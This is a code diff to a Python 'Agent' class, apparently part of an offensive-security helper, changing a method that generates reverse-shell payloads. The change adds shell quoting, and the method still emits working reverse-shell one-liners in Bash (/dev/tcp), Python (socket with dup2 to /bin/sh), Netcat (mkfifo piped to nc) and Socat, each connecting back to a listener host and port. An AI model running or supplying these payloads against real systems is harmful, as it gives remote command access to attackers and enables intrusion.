@@ -1496,15 +1496,22 @@ class Agent:
         return "\n".join(lines)
 
     def _do_reverse_shell(self, m, raw) -> str:
-        port = m.group(1) if m.group(1) else "4444"
-        lhost = self.context.get("lhost", "0.0.0.0")
-        self.context["lport"] = port
+        raw_port = m.group(1) if m.group(1) else "4444"
+        raw_lhost = self.context.get("lhost", "0.0.0.0")
+        self.context["lport"] = raw_port
+
+        port = shlex.quote(str(raw_port))
+        lhost = shlex.quote(str(raw_lhost))
+
+        py_code = f'import socket,subprocess,os;s=socket.socket();s.connect(({repr(str(raw_lhost))},int({repr(str(raw_port))})));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+        py_payload = f"python3 -c {shlex.quote(py_code)}"
+
         return (
-            f"🐚 Reverse Shell Payloads (LHOST={lhost} LPORT={port})\n\n"
+            f"🐚 Reverse Shell Payloads (LHOST={raw_lhost} LPORT={raw_port})\n\n"
             f"  [Bash]\n"
             f"    bash -i >& /dev/tcp/{lhost}/{port} 0>&1\n\n"
             f"  [Python]\n"
-            f'    python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'\n\n'
+            f"    {py_payload}\n\n"
             f"  [Netcat]\n"
             f"    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {port} >/tmp/f\n\n"
             f"  [Socat]\n"
